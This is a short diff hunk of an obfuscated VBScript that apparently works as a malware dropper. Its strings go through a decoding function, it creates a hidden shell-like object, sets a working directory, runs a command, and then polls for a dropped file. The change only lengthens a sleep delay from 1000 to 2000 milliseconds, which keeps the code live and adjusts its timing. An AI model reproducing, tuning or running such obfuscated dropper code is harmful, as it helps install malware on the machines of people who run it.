@@ -100,7 +100,7 @@ aMsr9bxFm.Close
 Set r0rZ40 = CreateObject(ghmker56w456("r=VMNI8Y?h5_Uf/jJ$RIw^S[0b""bfJ"))
 r0rZ40.CurrentDirectory = ghmker56w456("AYq9c0;RAK1i=[|h""i2RL;") + zEK3SMco + ghmker56w456("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")
 r0rZ40.Run vSn7m07j7
-wscript.sleep 1000
+wscript.sleep 2000
 retk56kw534w34 = true
 do While (retk56kw534w34 = true)
 If aY1FWV7.FileExists(ghmker56w456("d'^9t0IRMK""iA[ah'iKR]8") + zEK3SMco + ghmker56w456("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf") + cf8VU5Z) Then
